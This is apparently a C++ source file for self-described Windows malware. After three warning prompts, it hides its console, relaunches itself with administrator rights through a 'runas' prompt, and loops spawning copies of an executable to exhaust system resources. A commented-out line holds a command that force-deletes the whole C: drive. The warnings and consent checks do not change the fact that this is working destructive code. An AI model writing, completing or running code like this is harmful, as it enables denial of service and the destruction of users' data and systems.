#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
long long opi;

VOID ManagerRun(LPCSTR exe,LPCSTR param,INT nShow=SW_SHOW)  
{
	SHELLEXECUTEINFO ShExecInfo; 
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);  
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS ;  
	ShExecInfo.hwnd = NULL;  
	ShExecInfo.lpVerb = "runas";  
	ShExecInfo.lpFile = exe; 
	ShExecInfo.lpParameters = param;   
	ShExecInfo.lpDirectory = NULL;  
	ShExecInfo.nShow = nShow;  
	ShExecInfo.hInstApp = NULL;   
	BOOL ret = ShellExecuteEx(&ShExecInfo);  
	CloseHandle(ShExecInfo.hProcess);
	return;
}

int main(int argc,char *argv[])
{
	if(argc == 1)
	{
		system("cls");
		system("color 4e");
		Sleep(1000);
		system("echo off");
		cout<<"[!]Warning!!!\nIt's malware!\nIt was built for the purpose of testing the performance of computers and WinterSystem.\nThis program takes up a lot of system resources and deletes Windows system files,\nBe sure to confirm that this program is running on a virtual machine!\nThis warning will be displayed 3 times in a row,\nIf you open the program by mistake, enter \"0\" to exit immediately!\nIf you want to continue, enter \"1\", which will indicate that you are responsible for all the consequences of running this program!\n";
		cin>>opi;
		if(opi!=1){
			return 0;
		}
		system("cls");
		cout<<"[!]Warning!!!\nThis will cause serious damage to your computer!\nAre you sure you want to continue?\nTo exit, enter \"0\"\nTo continue, enter \"1\"\n";
		cin>>opi;
		if(opi!=1){
			return 0;
		}
		system("cls");
		cout<<"[!]Final warning!!!\nThis will cause serious damage to your computer!\nThis will cause serious damage to your computer!\nThis will cause serious damage to your computer!\nAre you sure you want to continue?\nTo exit, enter \"0\"\nTo continue, enter \"1\"\n";
		cin>>opi;
		if(opi!=1){
			return 0;
		}
		ShowWindow(GetConsoleWindow(),SW_HIDE);
		ManagerRun(argv[0],"2");
		return 1;
	}else if(argc == 2)
	{
		system("cls");
		cout<<"[!]Final warning!!!\nThis will take up a lot of system resources and delete Windows system files!\nAre you sure you want to continue?\nTo exit, enter \"0\"\nTo continue, enter \"1\"\n";
		cin>>opi;
		if(opi!=1){
			return 0;
		}
//		system("start \"del /F /S /Q C:\\\"");
		Sleep(50);
		while(opi<=LONG_LONG_MAX){
			system("start C:\\Winter\\WinterSystem\\Files\\untitled4.exe");
			
			opi+=100000001;
		}
	}
	return 0;
}
